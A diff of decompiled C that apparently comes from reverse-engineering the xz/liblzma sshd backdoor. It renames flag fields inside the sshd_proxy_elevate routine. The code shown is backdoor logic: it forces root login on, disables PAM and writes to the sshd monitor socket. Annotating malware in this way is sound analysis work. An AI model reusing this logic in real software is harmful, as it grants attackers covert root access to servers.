@@ -116,7 +116,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
     return FALSE;
   }
   uVar3 = args->cmd_type;
-  if ((uVar3 == 3) && ((args->args->flags2 & 0x40) == 0)) {
+  if ((uVar3 == 3) && ((args->args->monitor_flags & 0x40) == 0)) {
     if (args->rsa == (RSA *)0x0) {
       return FALSE;
     }
@@ -160,7 +160,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
       }
       goto LAB_0010843f;
     }
-    if ((pcVar13->flags3 & 0x20) != 0) {
+    if ((pcVar13->request_flags & 0x20) != 0) {
       return FALSE;
     }
 LAB_0010844c:
@@ -182,22 +182,22 @@ LAB_00108447:
       if (uVar3 == 2) goto LAB_0010845f;
       if (uVar3 != 0) goto LAB_00108447;
 LAB_00108434:
-      uVar1 = pcVar13->flags2;
+      uVar1 = pcVar13->monitor_flags;
       goto LAB_00108450;
     }
 LAB_0010843f:
-    if ((pcVar13->flags2 & 1) != 0) goto LAB_0010845f;
+    if ((pcVar13->monitor_flags & 1) != 0) goto LAB_0010845f;
   }
   *psVar6->permit_root_login_ptr = 3;
 LAB_0010845f:
   if ((args->cmd_type < 2) || (args->cmd_type == 3)) {
-    if ((pcVar13->flags1 & 0x40) != 0) {
+    if ((pcVar13->control_flags & 0x40) != 0) {
       if (psVar6->use_pam_ptr == (int *)0x0) {
         return FALSE;
       }
       *psVar6->use_pam_ptr = 0;
     }
-    if ((args->cmd_type == 3) && (bVar21 = pcVar13->flags2 & 0xc0, bVar21 != 0xc0)) {
+    if ((args->cmd_type == 3) && (bVar21 = pcVar13->monitor_flags & 0xc0, bVar21 != 0xc0)) {
       if (bVar21 == 0x40) {
         if (plVar5->exit == (pfn_exit_t)0x0) {
           return FALSE;
@@ -459,26 +459,26 @@ LAB_00108861:
               if (pcVar13 == (cmd_arguments_t *)0x0) {
                 return FALSE;
               }
-              if ((pcVar13->flags1 & 0x20) == 0) {
+              if ((pcVar13->control_flags & 0x20) == 0) {
                 BVar10 = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
               }
               else {
                 if (uVar11 == 2) {
-                  bVar21 = pcVar13->flags2 >> 1;
+                  bVar21 = pcVar13->monitor_flags >> 1;
 LAB_001088b7:
                   socket_index = (uint)bVar21;
                 }
                 else if (uVar11 < 3) {
                   if (uVar11 != 0) {
-                    bVar21 = pcVar13->flags2 >> 2;
+                    bVar21 = pcVar13->monitor_flags >> 2;
                     goto LAB_001088b7;
                   }
-                  socket_index = pcVar13->flags2 >> 3 & 0xf;
+                  socket_index = pcVar13->monitor_flags >> 3 & 0xf;
                 }
                 else {
                   socket_index = 1;
                   if (uVar11 == 3) {
-                    socket_index = pcVar13->flags3 & 0x1f;
+                    socket_index = pcVar13->request_flags & 0x1f;
                   }
                 }
                 BVar10 = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
@@ -507,12 +507,12 @@ LAB_001088b7:
               if (plVar5->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
-              if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->flags3 & 0x20) != 0)))) {
+              if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->request_flags & 0x20) != 0)))) {
                 BVar10 = sshd_get_sshbuf(sshbuf_vec,ctx);
                 if (BVar10 == FALSE) {
                   return FALSE;
                 }
-                ctx->exit_flag = pcVar13->flags1 & 1;
+                ctx->exit_flag = pcVar13->control_flags & 1;
               }
               sVar15 = fd_write(iVar12,puVar26,sVar20,plVar5);
               if (sVar15 < 0) {
@@ -540,9 +540,9 @@ LAB_001089b5:
               }
               else {
                 if (uVar3 != 3) goto LAB_0010897e;
-                if ((pcVar13->flags3 & 0x20) != 0) goto LAB_001089b5;
+                if ((pcVar13->request_flags & 0x20) != 0) goto LAB_001089b5;
               }
-              if (-1 < (char)pcVar13->flags1) {
+              if (-1 < (char)pcVar13->control_flags) {
                 return TRUE;
               }
 LAB_0010897e:
